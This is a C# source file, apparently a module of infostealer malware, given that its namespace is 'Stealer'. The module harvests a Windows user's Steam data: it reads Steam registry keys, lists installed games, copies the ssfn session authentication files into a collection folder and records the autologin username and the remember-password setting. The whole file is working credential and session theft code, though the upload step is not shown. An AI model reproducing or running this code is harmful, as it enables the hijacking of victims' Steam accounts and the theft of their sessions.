using System.IO;
using Microsoft.Win32;

namespace Stealer;

internal sealed class Steam
{
	public static bool GetSteamSession(string sSavePath)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
			if (registryKey == null)
			{
				return false;
			}
			string path = registryKey.GetValue("SteamPath")!.ToString();
			if (!Directory.Exists(path))
			{
				return false;
			}
			Directory.CreateDirectory(sSavePath);
			string[] subKeyNames = registryKey.OpenSubKey("Apps")!.GetSubKeyNames();
			foreach (string text in subKeyNames)
			{
				using RegistryKey registryKey2 = registryKey.OpenSubKey("Apps\\" + text);
				string text2 = (string)registryKey2.GetValue("Name");
				text2 = (string.IsNullOrEmpty(text2) ? "Unknown" : text2);
				string text3 = (((int)registryKey2.GetValue("Installed") == 1) ? "Yes" : "No");
				string text4 = (((int)registryKey2.GetValue("Running") == 1) ? "Yes" : "No");
				string text5 = (((int)registryKey2.GetValue("Updating") == 1) ? "Yes" : "No");
				File.AppendAllText(sSavePath + "\\Apps.txt", "Application " + text2 + "\n\tGameID: " + text + "\n\tInstalled: " + text3 + "\n\tRunning: " + text4 + "\n\tUpdating: " + text5 + "\n\n");
			}
			string[] files = Directory.GetFiles(path);
			foreach (string text6 in files)
			{
				if (text6.Contains("ssfn"))
				{
					File.Copy(text6, sSavePath + "\\" + Path.GetFileName(text6));
				}
			}
			Counter.Steam = true;
			string text7 = (((int)registryKey.GetValue("RememberPassword") == 1) ? "Yes" : "No");
			string contents = string.Format("\nAutologin User: " + registryKey.GetValue("AutoLoginUser")?.ToString() + "\nRemember password: " + text7);
			File.WriteAllText(sSavePath + "\\SteamInfo.txt", contents);
			return true;
		}
		catch
		{
			return false;
		}
	}
}
